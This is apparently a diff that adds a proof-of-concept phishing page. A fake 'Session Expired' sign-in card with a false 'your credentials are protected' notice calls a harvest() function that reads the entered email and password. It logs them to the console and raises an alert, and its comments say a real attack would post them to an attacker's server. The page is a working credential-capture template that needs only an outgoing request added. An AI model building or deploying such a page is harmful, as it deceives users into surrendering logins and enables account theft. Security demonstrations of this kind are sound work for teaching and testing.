@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Session Expired — Please Sign In</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: sans-serif; background: #f4f4f4;
+      display: flex; justify-content: center; align-items: center; height: 100vh;
+    }
+    .card {
+      background: white; padding: 40px; border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 100%; max-width: 380px;
+    }
+    h2 { margin-bottom: 8px; font-size: 20px; }
+    p  { font-size: 13px; color: #666; margin-bottom: 24px; }
+    label { font-size: 13px; font-weight: 600; display: block; margin-bottom: 6px; }
+    input {
+      width: 100%; padding: 10px 12px; border: 1px solid #ccc;
+      border-radius: 6px; font-size: 14px; margin-bottom: 16px;
+    }
+    button {
+      width: 100%; padding: 11px; background: #0052cc; color: white;
+      border: none; border-radius: 6px; font-size: 14px; cursor: pointer;
+    }
+    button:hover { background: #0041a8; }
+    .warn { font-size: 11px; color: #999; text-align: center; margin-top: 16px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Session Expired</h2>
+    <p>Your session has timed out. Please sign in again to continue.</p>
+
+    <label>Email</label>
+    <input type="email" placeholder="you@example.com" />
+
+    <label>Password</label>
+    <input type="password" placeholder="••••••••" />
+
+    <button onclick="harvest()">Sign In</button>
+
+    <p class="warn">🔒 Secured login — your credentials are protected</p>
+  </div>
+
+<script>
+  function harvest() {
+    const email    = document.querySelectorAll('input')[0].value;
+    const password = document.querySelectorAll('input')[1].value;
+
+    // In a real attack this would POST to an attacker-controlled server.
+    // For POC purposes we just log to console to demonstrate credential capture.
+    console.log('Captured:', { email, password });
+    alert('POC: Credentials would be sent to attacker.\nEmail: ' + email);
+  }
+</script>
+</body>
+</html>
